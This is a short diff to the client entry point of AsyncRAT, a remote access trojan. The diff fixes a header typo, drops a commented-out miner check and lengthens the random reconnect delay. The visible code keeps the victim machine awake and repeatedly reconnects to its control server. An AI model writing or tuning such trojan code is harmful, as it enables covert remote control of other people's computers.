@@ -9,7 +9,7 @@ using Client.Helper;
        │ Name         : AsyncRAT  Simple RAT
        │ Contact Me   : https:github.com/NYAN-x-CAT
 
-       This program Is distributed for educational purposes only.
+       This program is distributed for educational purposes only.
 */
 
 namespace Client
@@ -22,6 +22,7 @@ namespace Client
             {
                 Thread.Sleep(1000);
             }
+
             if (!Settings.InitializeSettings()) Environment.Exit(0);
 
             try
@@ -40,7 +41,6 @@ namespace Client
 
                 Methods.PreventSleep(); //prevent pc to idle\sleep
 
-                //new CheckMiner().GetProcess(); //check miner status
             }
             catch { }
 
@@ -51,7 +51,7 @@ namespace Client
                     ClientSocket.Reconnect();
                     ClientSocket.InitializeClient();
                 }
-                Thread.Sleep(new Random().Next(1000, 5000));
+                Thread.Sleep(new Random().Next(2000, 5000));
             }
         }
     }
